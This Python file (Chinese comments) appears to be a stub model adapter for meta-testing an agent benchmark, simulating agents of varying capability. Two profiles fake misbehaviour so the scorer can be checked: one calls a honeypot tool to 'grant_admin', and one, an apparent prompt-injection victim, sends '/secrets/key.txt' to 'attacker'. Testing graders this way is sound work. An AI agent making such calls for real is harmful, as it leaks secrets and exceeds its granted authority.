"""
桩模型适配器（ModelAdapter）：不联网、确定性、按 seed 产生 run 间方差，用于端到端
演示与元测试。每个策略读取 task.oracle_plan 与 grounding gold，按"能力档"产出 submission。

策略档：
  oracle        : 忠实执行 oracle_plan，恢复故障，grounding 全对，校准良好（p≈1）
  strong/medium/weak : 不同 per-run 成功概率 + grounding 命中率 + 校准好坏
  honeypot_caller : 调用蜜罐工具 -> critical（验证安全 hard-zero）
  injection_victim: 调用 exfil 工具 -> critical（验证注入越权判 0 + ASR）
  noop          : 不动作（验证空跑得 0 且不触发 by-agent）
"""
from __future__ import annotations

import random
from typing import Any, Dict, List
from schema import Task, Action, ModelSubmission, GroundingItem


PROFILES = {
    "oracle":   dict(p=1.00, g=1.00, calib="good",  mode="normal", redundant=0),
    "strong":   dict(p=0.90, g=0.92, calib="good",  mode="normal", redundant=0),
    "medium":   dict(p=0.65, g=0.70, calib="over",  mode="normal", redundant=2),
    "weak":     dict(p=0.30, g=0.45, calib="over",  mode="normal", redundant=4),
    "honeypot_caller":  dict(p=0.90, g=0.90, calib="good", mode="honeypot", redundant=0),
    "injection_victim": dict(p=0.90, g=0.90, calib="good", mode="injection", redundant=0),
    "noop":     dict(p=0.00, g=0.00, calib="under", mode="noop", redundant=0),
}


def _wrong_grounding(item: GroundingItem) -> Any:
    if item.kind == "closed_id":
        return []  # 漏报
    if item.kind == "numeric":
        return float(item.gold) * 1.5 if item.gold is not None else 0.0
    if item.kind == "iou":
        x, y, w, h = item.gold
        return [x + w, y + h, w, h]  # 完全错位，IoU≈0
    if item.kind == "cer":
        return "".join(reversed(str(item.gold)))
    if item.kind == "minimal_pair":
        return {"scores": {"i0c0": 0.0, "i0c1": 1.0, "i1c0": 1.0, "i1c1": 0.0}}
    return None


def _correct_grounding(item: GroundingItem) -> Any:
    if item.kind == "closed_id":
        return list(item.gold or [])
    if item.kind == "numeric":
        return float(item.gold)
    if item.kind == "iou":
        return list(item.gold)
    if item.kind == "cer":
        return str(item.gold)
    if item.kind == "minimal_pair":
        return {"scores": {"i0c0": 1.0, "i0c1": 0.0, "i1c0": 0.0, "i1c1": 1.0}}
    return None


class ModelAdapter:
    def __init__(self, model_id: str, profile: str):
        self.model_id = model_id
        assert profile in PROFILES, profile
        self.profile = PROFILES[profile]
        self.profile_name = profile

    def submit(self, task: Task, run_index: int = 0, seed: int = 0) -> ModelSubmission:
        rng = random.Random((hash(task.task_id) ^ (seed * 2654435761)) & 0xFFFFFFFF)
        prof = self.profile
        mode = prof["mode"]

        actions: List[Action] = []
        if mode == "noop":
            return ModelSubmission(actions=[])

        faithful = rng.random() < prof["p"]
        plan = list(task.oracle_plan)
        if not faithful and plan:
            # 退化：丢弃最后一个关键动作 -> 通常使 success 谓词/终态里程碑失败
            plan = plan[:-1]

        for i, step in enumerate(plan):
            actions.append(Action(action_id=step.get("action_id", "a%d" % i),
                                  tool=step["tool"], args=step.get("args", {})))
        # 冗余动作（制造效率 regret，但不影响正确性）
        for r in range(prof["redundant"]):
            if task.tools:
                noise_tool = next((t.name for t in task.tools if t.is_noise), None)
                if noise_tool:
                    actions.append(Action(action_id="noise%d" % r, tool=noise_tool, args={}))

        # 注入/蜜罐：插入越权调用 -> critical
        if mode == "honeypot":
            hp = next((t.name for t in task.tools if t.is_honeypot), None)
            if hp:
                actions.append(Action(action_id="hp", tool=hp, args={"cmd": "grant_admin"}))
        if mode == "injection":
            actions.append(Action(action_id="exfil", tool="exfil",
                                  args={"to": "attacker", "data": "/secrets/key.txt"}))

        # grounding 答案
        g_answers: Dict[str, Any] = {}
        confidences: Dict[str, float] = {}
        abstain: Dict[str, bool] = {}
        if task.grounding:
            for item in task.grounding.items:
                hit = rng.random() < prof["g"]
                g_answers[item.id] = (_correct_grounding(item) if hit
                                      else _wrong_grounding(item))
                # 校准：good -> 置信≈正确性；over -> 一律高置信；under -> 一律低
                if prof["calib"] == "good":
                    confidences[item.id] = 0.85 if hit else 0.35
                elif prof["calib"] == "over":
                    confidences[item.id] = 0.9
                else:
                    confidences[item.id] = 0.4
                abstain[item.id] = (not hit) and (prof["calib"] == "good")

        return ModelSubmission(actions=actions, grounding_answers=g_answers,
                               confidences=confidences, abstain=abstain)
